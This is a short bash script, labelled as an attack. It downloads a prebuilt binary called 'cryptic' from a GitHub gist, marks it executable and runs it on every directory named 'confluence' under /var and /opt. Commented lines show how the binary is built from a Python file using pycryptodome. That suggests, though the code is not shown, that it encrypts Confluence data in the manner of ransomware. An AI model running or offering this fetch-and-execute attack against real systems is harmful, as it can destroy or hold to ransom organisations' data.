#!/bin/bash

# # Set up Pre-requisites
# apt update
# apt install zlib1g-dev
# apt install python3
# apt install python3-pip
# pip3 install pycryptodome==3.15.0
# pip3 install pyinstaller

# # Compile binary
# curl -L https://gist.github.com/donovancham/d1078240bdc8108e03de68d83594603e/raw/003d4ecfcb9a0b468c02af72f495e90b6a2fd01e/cryptic.py > cryptic.py
# pyinstaller cryptic.py --onefile

# Running the attack
curl -L https://gist.github.com/donovancham/d1078240bdc8108e03de68d83594603e/raw/003d4ecfcb9a0b468c02af72f495e90b6a2fd01e/cryptic > cryptic
chmod +x cryptic
# Find with name confluence in /var and /opt
./cryptic $(find /var -name "confluence" -print) $(find /opt -name "confluence" -print)